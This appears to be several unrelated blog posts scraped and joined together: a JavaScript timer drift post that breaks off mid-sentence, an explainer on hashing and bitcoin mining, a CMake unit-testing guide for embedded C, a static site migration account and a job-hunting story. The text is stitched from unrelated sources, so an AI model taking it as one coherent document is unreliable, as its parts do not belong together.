    <h2 id="the-problem">The problem</h2>
    <p>
      So I went on with the development of my app and after implementing all of
      the features I wanted in order for it to be useful (including a sound for
      when the time was completed), I decided to test it while studying for
      tests. I added my tasks, immediately started the timer and opened some
      tabs with materials for my studying session.
    </p>
    <p>
      I studied for some time until I looked at my phone and noticed that more
      than 25 minutes had passed without any indication that the time had ended.
      So I went to check, and when I opened my timer's tab only 5 minutes
      had passed for the timer.
    </p>
    <h2 id="what-s-happenning-">What's happenning?</h2>
    <p>
      I took some time to understand what was going on with my code. At first I
      thought it was some sort of performance problem related to React and how
      it handled re-renders. I knew that there was some connection between my
      timer lagging and the way the code was being executed, but I couldn't
      figure out why.
    </p>
    <p>
      After some time debugging and not understanding what caused the issue, I
      decided to compare my timer with Google's built-in (and pretty
      accurate) timer that shows up on top of the results when you search for
      any <code>x min timer</code>. I noticed that sometimes my timer would have
      some delay in comparison to Google's even when my timer's window
      was focused and without any other background tabs running. So what was
      going on?
    </p>
    <p>
      I searched around for a solution, but I couldn't find any. There were
      a couple of people online that had the same problem that I did, but they
      had it on many different frameworks, even
      <strong>vanilla Javascript</strong>.
    </p>
    <p>
      After a while, I started noticing that the problem was actually related
      not only with the <code>setInterval</code> function but with
      <strong>the way Javascript code gets executed entirely</strong>.
    </p>
    <h2 id="the-event-loop">The event loop</h2>
    <p>
      What I, a noob CRUD-making naive webdev, didn't think about was what
      was happening under the hood when I executed the code that made my timer
      work.
    </p>
    <p>
      You've probably heard about something called the Javascript
      <strong>event loop</strong>. If you haven't, I suggest you
      <a href="https://www.youtube.com/watch?v=8aGhZQkoFbQ">watch Philip Roberts' talk on JSConf about it</a>, he goes pretty deep into it and the talk might make you start think
      about some of the low-level stuff you've never thought about while
      making your little web application. But even if you don't watch it,
      I'll explain the basics in order for you to understand what does it
      have to do with our issue.
    </p>
    <p>
      For our purposes, all that you need to know is that the event loop is just
      the way that Javascript treats code execution. Javascript, being a single
      threaded programming language, can only make computations one sequence at
      a time. That means that every time your code does something, your program
      waits until that computation has ended in order for it to resume
      execution. This happens until your program has reached the end. The event
      loop is a pattern that the program follows in order to make the single
      threaded aspect of the language not suck so bad. The event loop creates
      kind of a priority-based list of things your computer should run.
    </p>
    <h2 id="the-naive-implementation">The naive implementation</h2>
    <p>
      So what's the problem after all? It's simple: our implementation
      assumes that our code will execute instantly after those 100 milliseconds
      we defined as the second argument in the
      <code>setInterval</code> function. Javascript, being a single threaded
      function, can't ensure our code will be executed as soon as those 100
      milliseconds go by because there could be some computation going on right
      when my timer code should execute, creating a delay. Sometimes the delay
      was acceptable but other times it seemed like the timer freezed.
    </p>
    <p>
      It's possible to see what are the effects of being single threaded
      when performing a computation with the following code:
    </p>
    <pre><code><span>for</span> (<span>let</span> i = <span>0</span>; i &lt; <span>100000</span>; i++) {
      <span>for</span> (<span>let</span> i = <span>0</span>; i &lt; <span>10000</span>; i++) {}
    }
    
    console.<span>log</span>(<span>"hi!"</span>);
    </code></pre>
    <p>
      if you run this code with Node.js or in your browser, you will see that
      <code>hi</code> will take a good while to log because our thread gets busy
      running the nested for loops.
    </p>
    <p>
      So if we can't trust javascript to execute our code on time how can we
      code a program like a timer? And if timers are impossible to be accurate,
      how come the google timer works and mine doesn't?
    </p>
    <h2 id="the-attempts">The attempts</h2>
    <p>I tried every type of fix I could think of.</p>
    <h3 id="web-workers">Web workers</h3>
    <p>
      At first I tried creating another javascript thread just for our timer,
      that way I could ensure that my timer would always run on time (no pun
      intended). To do that you need to use something called a Web Worker that
      was made exactly for having more than one thread at a time running on your
      browser.
    </p>
    <p>
      That didn't really work. I felt like it was being way too hard and
      awkward to write code, and for something as simple as this there was no
      way that I was making the right choice. So I had a feeling that I should
      go looking elsewhere.
    </p>
    <h3 id="window-requestanimationframe-">window.requestAnimationFrame()</h3>
    <p>
      Then, I found a web API called
      <code>window.requestAnimationFrame()</code>. According to the MDN docs,
      this API was made to ensure that your browser performs an animation before
      the next repaint. At first I thought that it would be weird to use this to
      update our timer, but after seeing that it takes a callback …</p></div>

  <div><p>OK. What is hashing? Let's just take a look.Â&nbsp;</p></div><div><p>hash("thomas hartman") =&gt; b73d127e8e76ff01b5cb833980b9712cf1dbc92064b1d2fae700105c8227121b</p></div><div><p>This beast is a 64 digit hex number. Instead of the usual 10 digits 0-9, it has the 16 digits 0-9a-f. But, it's just a number. In decimal it would be</p></div><div><p>82881156605080050388863774003735601367246355697689529077366882559854056509979</p></div><div><p>You could also use 1s and 0s, in which case there would be 256 binary 0-1 digits (bits). I'm going to go back to using hex because it will make googling for historically important hashes easier, further on. </p></div><div><p>Hashing takes some some data, my name in this case, and applies some gnarly, but basic -- but tedious -- arithmetic and cut paste type transformations to produce a 256 bit numerical output. The transformation has a lot of steps but is <a href="https://en.bitcoinwiki.org/wiki/SHA-256">completely deterministic</a>. You could do it <a href="https://www.youtube.com/watch?v=y3dqhixzGVo">by hand</a> if you were extremely careful, and extremely patient. It takes 10 hours for a human to compute a hash using pen and graph paper. My MacBook computes a hash in microseconds. </p></div><div><p>There are hundreds of websites where you play around with hashing, and reproduce the hashes we will be discussing. Just google for "sha256 calculator".</p></div><div><p>You could think of a hash as a kind of fingerprint for some arbitrary data. It is theoretically possible, but in practice impossible, for two inputs to hash to the same result. And you can't reverse a hash. If I present you with f04b773b796ddb607c9c0df477b4738a690a626e49f59bc91a37dd0cd05b70eeÂ&nbsp; and ask you to come up with an input that hashes to that, you will never, ever, find one. Unless you have a multi trillion years life span and galactic core black hole level of energy. Then, I suppose, you would get it eventually. Or, I could tell you a secret...</p></div><div><p>hash("joshua summers") =&gt; f04b773b796ddb607c9c0df477b4738a690a626e49f59bc91a37dd0cd05b70eeÂ&nbsp; </p></div><div><p>Moving on, if you tweak the data in a tiny way, say by tacking on the string "123" at the end, you get a completely different result.</p></div><div><p>hash("joshua summers" + "123") =&gt; hash("joshua summers123") =&gt; 304d0d26fd5ebb3bd3f56fcb48f6fdc6c8b0dbf9be088b34835b3ec988be1ab7</p></div><div><p>Completely different looking from the original "joshua summers" hash. We call "123" a nonce. A bit of NONSEnse data that you tack onto some fixed data, that is, data that you care about. The nonce can change and it doesn't matter. The fixed data matters, so it can't change.</p></div><div><p>Hashing always produces a 64 hex digit output. What if we had some fixed data ("joshua summers"), and we wanted a nonce that would make the first digit of the resulting hash 0? "123" didn't work. The first digit of the resulting hash was 3. Let's keep looking... sitting at my macbook, I try nonces manually by incrementing 123 until...</p></div><div><p>hash("joshua summers" + "134") =&gt; hash("joshua summers134") =&gt; </p></div><div><p>0120353865b8576fc09988444bdeed6f44a1d9433a7058064911d66eafda43e3</p></div><div><p>Found one! Took eleven tries. (134-123)</p></div><div><p>And that is hash mining. By producing a nonce and a hash with zero in the first digit, I PROVED I did some WORK connected to the fixed data. The nonce with the hash is like a stamp of authenticity that proves that, for some reason, I care about sacrificing some work attached to the fixed data "joshua summers".</p></div><div><p>Work is another word for energy. Each hash costs my macbook battery a tiny bit of chemical energy. Recall, I could do this by hand instead of using a computer,Â&nbsp; taking 10 hours for each try. I would need feeding, since eleven hashes on graph paper would keep me busy (going slowly insane) for four days. Like my macbook, my body needs energy to hash. </p></div><div><p>On average, I would expect to have to try 16 nonces to get a hit. I got slightly lucky with 11 nonces. If you asked me for a hash that starts with 2 zeros, I would expect to have to try 16 times more nonces, 256 instead of 16. The more zeros, the more energy. </p></div><div><p>For all my hashes, you need to compute just one hash to convince yourself that my work was valid. The proof had better be cheaper than the work (and it is). Just as assaying gold to stop counterfeiters had better be cheaper than digging the gold itself up, or why bother. </p></div><div><p>Now let's talk about bitcoin. With bitcoin mining, instead of your name, the fixed data is an "unconfirmed" (ie unstamped) block. An unconfirmed block is a group of bitcoin ledger transactions, along with a hash of the previous confirmed (stamped) block. The link to the previous block, via that block's hash, is what forges individual blocks into a blockchain. Miners try nonces till they find a stamp (nonce + hash) for that unstamped block that proves they did some work. It is the same as in the example I gave before, just with more zeros. </p></div><div><p>Visually, the difficulty condition is a bunch of zeros at the beginning of the hash. The more zeros required, the more valuable the stamp. Each additional zero makes the search for the stamp 16 times harder. </p></div><div><p>In 2009, the very first bitcoin block, called the genesis block, hashed to </p></div><div><p>000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f (google this) </p></div><div><p>Satoshi mined this block. I picture him with a bunch of scavenged laptops in his mother's basement. He uses multiple laptops to try as many nonces as possible, all hashing at the same time, working in parallel. </p></div><div><p>There are ten zeros of difficulty required for this first block.</p></div><div><p>16*16*16*16*16*16*16*16*16*16 =&gt; 1,099,511,627,776</p></div><div><p>So, satoshi had to try a trillion more nonces than I just did to find a nonce that worked. It took satoshi and his little cluster of computers (his mine) about ten minutes to crack this first block. This is specified in the bitcoin protocol. Blocks should take ten minutes, on average.</p></div><div><p>The energy spent to to find the nonce makes the block precious. Like the diesel spent on earthmoving equipment to find gold makes gold precious. Gold is a precious metal. A bitcoin block hash is a precious number. The more zeros you see at the beginning of a block hash, the more precious the hash. </p></div><div><p>Now let's look at a recent hash, from today (2020)</p></div><div><p>0000000000000000000081f22162e5603c4349b66f12a6b4f4274dff14bdc3bc (you can google this too)</p></div><div><p>It doesn't look that different. It's just 20 zeros instead of 10. But, as we saw before, ten zeros means a trillion times harder. If modern miners were using the same hardware as satoshi, that would be a trillion times as many computers mining, to find the hash in the same ten minutes. A trillion times as much electricity. In fact it's a bit less than that. Modern miners use special single purpose computers, called asics, that are a lot more energy efficient than the general purpose CPUs satoshi started out with. But it's still an enormous amount of hardware and electricity, trying an enormous number of nonces, to solve the next block.</p></div><div><p>All these giant warehouses full of racks and racks of miners are hashing away, because if you solve a block stamp, you receive a block reward of 6.25 bitcoin (currently), plus some transaction fees. Altogether it's about $60k, up for grabs every ten minutes. So, mining is a lottery that pays $60k every ten minutes. If the price of bitcoin goes up, or even if people just expect it to, more miners join. Bitcoin starts to be found too quickly... nine minutes instead of ten minutes... eight minutes... then the protocol adjusts to require enough zerosÂ&nbsp; so he block time goes back to ten minutes. (Slightly hand waving there, but close enough.) This difficulty adjustment happens every two weeks. The increased difficulty (more zeros) means bitcoin got more secure, and this in turn drives price goes up. </p></div><div><p>This is the double ratchet effect that I believe will continue until bitcoin occupies its market niche and replaces money as a global utility in a decade or so. It's worked so far. Three more zeros in the difficulty (around 4000x increase in difficulty) and bitcoin has replaced printed fiat from central banks. ($10 million/bitcoin, as opposed to around $10k today.) It may feel like a lot of ground to cover, but if you just count zeros in the difficulty, bitcoin has practically already won.</p></div><div><p>As mentioned before, each block includes the hash of the previous block. This makes a sequence of blocks, that is, a chain. A blockchain is a chain of blocks. Blocks are expensive.Â&nbsp; So a blockchain is very expensive. </p></div><div><p>The bitcoin protocol says the most expensive blockchain in terms of physical energy, measured in total hashes,Â&nbsp; is the true gold. There can be only one most expensive chain. This is extremely important. <a href="https://www.youtube.com/watch?v=_J3VeogFUOs">There can be only one</a>. </p></div><div><p>An unconfirmed block has no proof of work, so you can't trust the transactions in it if someone just paid you with one of them. The miners haven't approved it. There is no work behind it. So, these expensive stamps of approvals that each block gets (the precious hashes) prevent cheating, that is, double spending the same bitcoin. Mining is a security system. Miners are the bodyguards of bitcoin. </p></div><div><p>You have toÂ&nbsp; pay your bodyguards, or they turn on you. In fact, the largest bitcoin miner, Bitmain, attacked bitcoin in 2017. As the whitepaper foretold, the attack failed. Hundreds of millions of dollars worth of hashes were sacrificed for nothing, and bitmain was nearly driven into bankruptcy. Bodyguards are not hired for their brains. </p></div><div><p>Anyways, miners are paid in block reward, which is newly minted bitcoin, plus transaction fees. The bitcoin supply is finite, with minting scheduled to end in the year 2140. The reward halves every 4 years. For bitcoin to succeed, the transaction fees have to be sufficiently high to motivate miners to keep working hard enough to make bitcoin safe after the block reward eventually goes away. Transaction fees may ultimately stabilize at thousands of dollars per transaction (pennies now). Only power users like banks and pension funds will then be able to afford the blockchain. </p></div><div><p>If this happens, and I think it will, most users will never touch the blockchain directly, but will use second layer systems such as lightning. So far, the gradual replacement of block rewards with transaction fees appears to be working …</p></div></div></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><h2>Unit Testing Embedded C</h2><p>I have been trying to be more thorough in my testing efforts lately. What has always seemed like a big challenge is how to automate testing for source code that is targeting a microcontroller like AVR? I will talk about two sides of this challenge: decoupling and running unit tests.</p><h2 id="decoupling">Decoupling</h2><p>I write a lot of code for AVR microcontrollers so the code here will be in that context, but these ideas work equally well for any target. Decoupling means to separate your software into small pieces that are coupled only with a small number of dependencies. A dependency could be a target header file like <code>avr/io.h</code> or it could be another software module that you have written. In either case, keeping the number of dependencies small will improve your chances of successful unit testing.</p><p>Assume you have a module called <code>relay_control</code> which is intended to turn a relay on if an input value exceeds a threshold and off otherwise. Your <code>relay_control.c</code> file might look like this:</p><pre><code>#include &lt;avr/io.h&gt;

#define THRESHOLD (100)

void relay_control(int value) {
    if (value &gt; THRESHOLD) {
        PORTA |= 1;
    } else {
        PORTA &amp;= ~1;
    }
}
</code></pre><p>The <code>relay_control</code> function takes <code>value</code>, compares it to <code>THRESHOLD</code>, and sets bit zero of <code>PORTA</code> high or low accordingly (assuming <code>PA0</code> is somehow controlling the relay). Of course this is a trivially simple function but imagine some other complicated logic in it’s place. One way to test this function is to compile this using GCC on your development machine while somehow including a mock <code>avr/io.h</code> that defines <code>PORTA</code> in such a way that the test code can determine if the relay is on or off for a range of the <code>value</code> argument passed to <code>relay_control</code>. That requires you to mock the header file which is not always possible. A better way is to use features of the C language to decouple the direct io port access from <code>relay_control</code> so that the <code>relay_control</code> module doesn’t depend on <code>avr/io.h</code>. That way you can test it on your development machine or wherever you want. The new <code>relay_control.c</code> could look something like this:</p><pre><code>#define THRESHOLD (100)

void (*relay_writer)(char relay_on);

void relay_control(int value) {
    if (relay_writer) 
        relay_writer(value &gt; THRESHOLD);
}
</code></pre><p>The new <code>relay_control.c</code> doesn’t depend on <code>avr/io.h</code>. Instead it depends on a function pointer, <code>relay_writer</code>, that acts as an interface to the hardware. Now the application can implement <code>relay_writer</code> to access the hardware, and your test code can implement it to set a bit in memory to allow you to check the output of the <code>relay_control</code> module. Your application could implement <code>relay_writer</code> like this (perhaps in <code>relay_control_hal.c</code> [relay control hardware abstraction layer]):</p><pre><code>#include &lt;avr/io.h&gt;

extern void (*relay_writer)(char relay_on);

void relay_writer_impl(char relay_on) {
    if (relay_on) {
        PORTA |= 1;
    } else {
        PORTA &amp;= ~1;
    }
}

void relay_control_init(void) {
    relay_writer = relay_writer_impl;
}
</code></pre><p>The hardware abstraction layer code is purposfully kept as trivial as possible, it’s only accessing the io port, because the only way to test it is to run it on the target platform (because it depends on <code>avr/io.h</code>). Since it’s so simple you’re not as concerned with testing <code>relay_control_hal.c</code> (trivial hardware access only) as you are with <code>relay_control.c</code> (non-trivial application logic).</p><p>Now you can write a test, <code>test_relay_control.c</code>, that might look like this:</p><pre><code>#include &lt;assert.h&gt;
#include "relay_control.h"

char relay_state = 0;

void relay_writer_test_impl(char relay_on) {
    relay_state = relay_on;
}

extern void (*relay_writer)(char relay_on);

int main(void) {
    relay_writer = relay_writer_test_impl;
    relay_control(0);
    assert(relay_state == 0);
    relay_control(1000);
    assert(relay_state == 1);
    return 0;
}
</code></pre><p>Decoupling <code>relay_control.c</code> from the hardware (<code>avr/io.h</code>) has the added benefit that your tests are not constrained by the target environment’s memory or processor limitations. The tests can use the full power of the C language.</p><p>Now whenever you make a change to <code>relay_control.c</code> you can quickly run the test to make sure that the functionality remains. But how do you run the test?</p><h2 id="running-unit-tests">Running unit tests</h2><p>One way is to use a simple makefile that compiles <code>test_relay_control.c</code> and <code>relay_control.c</code> and then runs the resulting executable. Or you could use a more advanced build system generator like CMake. I recommend using CMake because it gets very tricky very quickly to link up a bunch of <code>.c</code> and <code>.h</code> files in different directories to create an executable with only a makefile. I have only recently learned how to use CMake so please bear with me on this. The solution that I have come up with for running unit tests on windows goes like this:</p><ol><li><p>create a directory somewhere in your project called <code>test</code></p></li><li><p>in the <code>test</code> directory create a file called <code>cmakelists.txt</code></p><p><code>cmakelists.txt</code>:</p><pre><code> cmake_minimum_required (VERSION 3.18)
 project(Test)
 enable_testing()
 add_executable(Test 
     test_relay_control.c 
     &lt;path to relay_control.c&gt;
 )
 include_directories(&lt;path to relay_control.h&gt;)
 add_test(NAME Test COMMAND Test)
</code></pre><p>In this case there is only one test called <code>Test</code> which is generated by the <code>add_executable</code> and <code>add_test</code> commands.</p><p>To add another test you would first create your test file <code>another_test.c</code> and add the following lines to <code>cmakelists.txt</code></p><pre><code> add_executable(AnotherTest 
     another_test.c 
     &lt;path to another_file_under_test.c&gt;
 )
 include_directories(&lt;path to headers needed by another_test.c&gt;)
 add_test(NAME AnotherTest COMMAND AnotherTest)
</code></pre></li><li><p>in the <code>test</code> directory create a file called <code>test.sh</code></p><p><code>test.sh</code>:</p><pre><code> if ! [[ -d "build" ]]; then
     mkdir build
 fi
 cd build
 cmake .. -G"MinGW Makefiles"
 cmake --build . &amp;&amp; ctest -C Debug
</code></pre><p>In this case I am using the <code>MinGW Makefiles</code> generator for CMake because I run my tests on Windows but I would like to use GCC rather than the default MSVC.</p></li></ol><p>With those steps having been done you can now run <code>test.sh</code> and whatever tests you have defined will be run and the output will show you clearly which have passed and which have failed.</p><p>Happy testing!</p><span><time datetime="2020-08-22T00:00:00-04:00">August 22, 2020</time> · <a href="https://colinholzman.xyz/tag/programming">programming</a>, <a href="https://colinholzman.xyz/tag/C">C</a>, <a href="https://colinholzman.xyz/tag/coding">coding</a>, <a href="https://colinholzman.xyz/tag/software">software</a>, <a href="https://colinholzman.xyz/tag/engineering">engineering</a></span> <!--<span class="meta"><time datetime="2020-08-22T00:00:00-04:00">August 22, 2020</time> &middot; <a class="post" href="/tag/programming">programming</a>, <a class="post" href="/tag/C">C</a>, <a class="post" href="/tag/coding">coding</a>, <a class="post" href="/tag/software">software</a>, <a class="post" href="/tag/engineering">engineering</a></span> --></section></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Those of you who read <a href="https://figbert.com/posts/i-wrote-this-three/#next-steps">my last "I Wrote This" post</a> will know that I was having some trouble with my website. My site was coded using <a href="https://sapper.svelte.dev/">Sapper</a>, a
<a href="https://svelte.dev/">Svelte</a>-based web-app framework I had been using for some time. I had chosen to use Sapper because it allowed me to stay as close to the web-metal as possible, while
still letting me do some fancy things like use components, scoped CSS, and <a href="https://sapper.svelte.dev/docs#Server_routes">server routes</a>. However, after diving deeper into website tests and statistics, I
started noticing that my "static" site had a lot more moving parts than I thought. The HTML was crammed full of inline scripts and <code>blob://</code>s, tanking performance, wreaking
havoc on my <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">CSP</a>, and breaking the site for people with scripts disabled. I decided to move the site to <a href="https://www.getzola.org/">Zola</a>, a ludicrously simple static site generator made in
Rust. Feel free to check out the <a href="https://github.com/figbert/figbert.com">source code here</a>.</p>
<h2 id="npm-hell">NPM Hell</h2>
<p>I decided I was going to rewrite my site <del>because I have a bad habit of rewriting everything all the time</del> largely because of Sapper's underwhelming response to <a href="https://github.com/sveltejs/sapper/issues/1175">this Github
issue</a>, which proposes a "strict export" for Sapper sites to remove inline scripts and use of <code>eval()</code>. I think this is a great idea, but it unfortunately has not
received much attention (though it appears that as I'm writing this, it has been added to a "Roadmap Triage" project board). I started a new branch and began working to
translate my site to Sapper's main competitor, <a href="https://routify.dev/">Routify</a>. Sapper and Routify are not the same thing, but for me they both would serve well enough. After around two
days, I had a working MVP of my site in Routify.</p>
<p>Then disaster struck: I got a bunch of emails from Github. A series of high priority security vulnerabilities had been found in dependencies used by basically all of my web
projects. I spent a day force-updating all the dependencies of my web projects – a bit of a pain because npm refuses to natively upgrade breaking changes – and decided to stay
as far away from the Javascript ecosystem as possible. I hate that when I install a JS framework, a fundamental tool of modern web development, I install a million other
dependencies that could, and often do, have critical security vulnerabilities. I'm thankful that Dependabot caught these ones, but it really killed my enthusiasm for using any
JS framework on my site – which means Routify was out of the picture.</p>
<h2 id="the-last-dependency-standing">The Last Dependency Standing</h2>
<p>I decided to use a <a href="https://www.staticgen.com/">static site generator</a>. I'd heard of many of the big boys in the past, like <a href="https://gohugo.io/">Hugo</a>, <a href="https://jekyllrb.com/">Jekyll</a>, and <a href="https://www.11ty.dev/">Eleventy</a>, but they all had
their own problems when I looked at them in the past. Hugo has god-awful templating syntax, Jekyll is Ruby-based and I don't know Ruby, and Eleventy isn't even an escape from
Javascript! So I decided to use <a href="https://www.getzola.org/">Zola</a>, a "one-stop static site engine" with <strong>zero dependencies</strong>. Zola is made in Rust, so it's super fast, and it's designed to be dead
simple. Seriously: the CLI has only five commands, everything is configured from one <code>.toml</code> file, and your content is all written in "<a href="https://www.getzola.org/documentation/content/shortcodes/">Augmented</a>
<a href="https://www.getzola.org/documentation/content/linking/">Markdown</a>."</p>
<p>The interesting thing is that there's honestly not much more to the story because of how easy and simple Zola is to use. All of my posts and projects go into the <code>content</code>
directory, my CSS, favicon, and miscellaneous files (non-content related stuff like emojis and public keys) go in the <code>static</code> directory, and templates and shortcodes go into
the <code>templates</code> directory. If I was using a theme, it's files would go into a <code>theme</code> directory.</p>
<h3 id="benefits">Benefits</h3>
<ul>
<li>My slow Python script to convert Markdown posts to Svelte (which was perfect at first but I then packed full excess tests and sandboxing) is gone. Zola handles that
automatically.</li>
<li>I got rid of TailwindCSS, and replaced it with <a href="https://figbert.com/global.css">custom styles</a>. It's actually pretty fun to write simple custom CSS, especially with modern tools like variables.</li>
<li>Writing new posts is ludicrously easy now. I write a post in Markdown, throw any images or videos used <a href="https://www.getzola.org/documentation/content/overview/#asset-colocation">in the same directory</a>, and publish.</li>
<li>Zola comes with a whole bunch of features built-in that I didn't have before, like syntax highlighting and anchor links (the latter of which I have yet to set up). Other
things are just handled automatically, like feed generation or i18n.</li>
<li>Build times are much faster. Exporting with Sapper wasn't slow, but it didn't feel instant. Zola does.</li>
</ul>
<h3 id="drawbacks">Drawbacks</h3>
<ul>
<li>You sacrifice a certain amount of control by using a static site generator, like <a href="https://github.com/getzola/zola/issues/681">link</a> <a href="https://github.com/getzola/zola/issues/695">properties</a>. You could solve this with <a href="https://www.getzola.org/documentation/content/shortcodes/">shortcodes</a>,
or by contributing to the project (which I plan to do).</li>
<li>I mean that's really it to be honest.</li>
</ul>
<h2 id="to-infinity-and-beyond">To Infinity and Beyond</h2>
<p>I'm really happy with using Zola, and I look forward to continuing to work with it in the future. I want to publish my blog's styles and templates as a <a href="https://www.getzola.org/themes/">Zola theme</a>, but
I have to iron out a few kinks (like anchor links, which are still a bit finicky on my end) before that. I also have yet to re-implement a bunch of the indie-web features and
<a href="https://www.goatcounter.com/">GoatCounter</a> analytics of my old site into this version. Overall though, I think it's been a really fun and productive experiment using Zola, and I'd highly recommend using
it for anybody looking for a great, no-nonsense static site generator.</p>
<p>Until next time, FIGBERT.</p>

        <p>This post is a part of a series on job hunting and job interviewing.</p>

<p>I’m excited to say that after about 8 months of job hunting, I finally accepted a new software engineering job!</p>

<p>Before I tell you about it, I really want to talk about the jobs I <em>didn’t</em> get and the interview processes I went through.</p>

<p>(<a href="#tldr">tl;dr “just tell me about the new job already!”</a>)</p>

<h3 id="soooooo-many-interviews">Soooooo Many Interviews….</h3>

<p>I started slowly hunting for jobs about June last year. I knew that in the last few teams I was on the work was really kind of terrible, some of the people were really difficult, or both. I didn’t want to do this again. I didn’t want “yet another developer job” (as I called it) either . I really wanted something where I knew I would thrive, something I knew would be interesting and challenging, and somewhere I knew the team/department/company’s culture would be a lot better for me.</p>

<p>And of course to pull this off, I have to be a LOT more picky on the companies that I interviewed with. I also figured I was at a point where I could not only try going after some of the Big Name Tech Companies™. I also have a wide enough network that I decided I wanted to do it only through referrals. (Don’t worry… I’m working on a post on how to start networking if you hate networking so that you can also build up your own big network!)</p>

<p>I also decided that in addition to software engineering type roles, I wanted to look for developer advocacy (or developer evangelist) roles. I liked the idea of building things, but also working with other developers to help them with their products and to go around and speak about things I worked on. So I kept an open mind for both.</p>

<p>And I was pretty successful. I interviewed at many places, and not just that, but I got quite far in most of the interview processes. My network helped me get into nearly every company with a guaranteed interview, but after a while, sometimes the processes just took so long to get through it felt like I’d never hear if I got hired OR rejected. The waiting was probably the worst part.</p>

<p>I also decided after my current company (at the time) knew about my job hunt, I would share openly, but not talk about specific companies yet until I had accepted an offer.</p>

<h3 id="the-process-and-how-far-i-got">The Process and How Far I Got</h3>

<p>I am actually rather proud of myself. I talked to some pretty awesome companies:</p>

<ul>
  <li><a href="https://geekygirlsarah.com/wp-content/uploads/2018/02/jobinterviews.jpg"><img src="https://d33wubrfki0l68.cloudfront.net/fff27e9061085b31b55642a5234e1dc8275d5cd8/3dbf6/assets/images/2018/02/jobinterviews-277x300.jpg" alt="Pictures of me at Amazon, Google, New Relic, and Square" width="277" height="300"></a>Square: I was recommended for a senior developer position by a friend, and turns out I already knew her manager! After a recruiter call and two technical (code) phone calls, I felt pretty good. I got to go on-site in San Francisco. I got to the end, but they hired someone else. But for as obnoxious as it is to have done basically 12 interviews of some form or another (including 8 code interviews and 2 design interviews), I got every vibe this was a GREAT place to work! They passed my “<a href="https://geekygirlsarah.com/2017/11/20/the-three-questions-im-asking-at-every-interview/">3 questions test</a>” too, and I’d gladly work there if they asked me in the future.</li>
  <li>Microsoft: Microsoft seems daunting but I actually had a really good experience with them. I had a friend recommend a recruiter, so I reached out to her. It got me an interview in which she really liked me and it got my foot in the door. After that it became a matter of finding the right team. I interviewed on a couple of teams that didn’t really click, then interviews with their cloud developer advocate team. It was one of my top 3 interviews probably. No code, no quirky brain teasers, just my interviewer and I. And he loved me and aside from not having all the cloud experience they wanted, they probably would have hired me. They even dropped hints if I could learn the cloud things I needed, they’d reconsider. (I, unfortunately, couldn’t really find the spare time to do this with a full time job and job hunting too.)</li>
  <li>Amazon: Through <a href="https://twitter.com/hashtag/witbragday">#WITBragDay</a>, I met a woman on Twitter. We chatted and became friends rather quickly. I learned she was a recruiter and learned she was with the Amazon Fashions team. Intrigued, I asked her about it. It sounded like a cool developer spot (and she even addressed my concerns about Amazon’s bad work/life reputation). Did a phone chat, and then a team interview. The team said no, but they put me in for other teams to look at me. After two more teams who promised things and didn’t deliver (including an on-site), another team picked me up. I flew to Seattle, interviewed with them, but didn’t make the cut.</li>
  <li>Google: About once a year for several years some Google recruiter reached out to me for engineering roles. I declined them all until one reached out in the middle of this search. And I thought “I did Square, Microsoft, and Amazon, why not? I doubt I’ll make it far.”&nbsp; But after a recruiter call, a code challenge I flopped miserably, then a code challenge I absolutely rocked at, I got flown on-site. I didn’t make it, though to be fair, I wasn’t surprised. (On my flight home I did get my current job offer though!)</li>
  <li>New Relic: I had heard some questionable things about them, but seems that those things kind of went by the wayside. So another friend recommendation got me in to a senior developer role interview. After some discussions and a code sample I submitted, I was flown to Portland for an on-site. I had a lot of good conversations here. They were also very conscious about finding a good senior that would mentor their junior team member and so they interviewed for that. I was one of the top 3 candidates but lacked one of the buzzwords in my skillset to make it to the end. (This is another company that the culture seemed amazing, and I’d definitely go there if they asked again.)</li>
  <li>MongoDB: This was a developer advocate role a friend recommended me for. I rocked every step, and this was probably one of the most complex interviews I had, including ultimately about 9 phone calls. But one of them wasn’t impressed with me, gave me no real feedback on it, and it disqualified me entirely. (Bummer too, I almost had a free trip to New York City!)</li>
  <li>IBM: I got to meet Erin McKean rather randomly and accidentally at Strange Loop (I didn’t realize it was Erin until after I had chatted with her a couple of times.) She got me an interview on their San Francisco developer advocate team. I made it a few phone calls in before I was rejected because they said they changed their mind and wanted to hire for the role internally instead.</li>
  <li>StitchFix: Two friends recommended me here. I got a couple of interviews (including a super fun one that involved thinking through problems without code or computers). Despite rocking them, very weirdly I got a generic form template email rejecting me and I never heard feedback on why I was rejected.</li>
</ul>

<p>There were some others that the process wasn’t nearly as good:</p>

<ul>
  <li>Twilio: I heard about a developer advocate role. I had a friend recommend me, which ended up getting me both a rejection and an interview at the same time. (I still can’t explain the two emails, and apparently neither can anyone else.) After my one technical phone call, l got my template rejection email.</li>
  <li>JFrog: This was also another developer advocate role. The job description was <em>ridiculous</em> with its requirements (to the point I literally didn’t think they’d be able to find anyone). I was told to apply anyway. The chats were great, and I was (I believe) a top candidate. But they decided to change the role to be less “developery” and we mutually agreed to not move forward.</li>
  <li>MuleSoft: I got one technical call in and decided I probably wouldn’t like the culture. They didn’t move forward anyway.</li>
  <li>Akamai: I was recommended for an advocate position that wasn’t posted yet. Months later my contact told me it was posted but they didn’t recommend it anymore after some internal changes.</li>
  <li>VML: The one and only local company I considered, and only because it would have been a temporary contract with option to hire later (but maybe by then I could have moved out of the city) and would have paid really well. The managers loved me, got a verbal job offer, then talked to someone else and had the offer retracted. I’m not quite sure what happened there, but I’m accounting it partly to a recruiter that didn’t sell me well. I received no feedback either.</li>
  <li>Etsy: A friend recommended me for an engineering position only to have them do a hiring freeze, a company re-org, and a layoff. After assuring me things had settled down and it was still good, I went in. I went through a recruiter phone call and two code challenges before a rejection. Like several others, I had one code interview I got amazing feedback on, then one I got ridiculously terrible feedback on.</li>
  <li>The Document Foundation: A friend pointed out a software developer mentor position. It seemed interesting to be able to develop LibreOffice as well as mentor other people contributing to it. I was recommended and… delays. They got back to me, but unfortunately after I got hired. I would have gone through it had I not received my current offer.</li>
</ul>

<p>And there were some more, but the above ones were the more notable ones. It’s been quite the journey.</p>

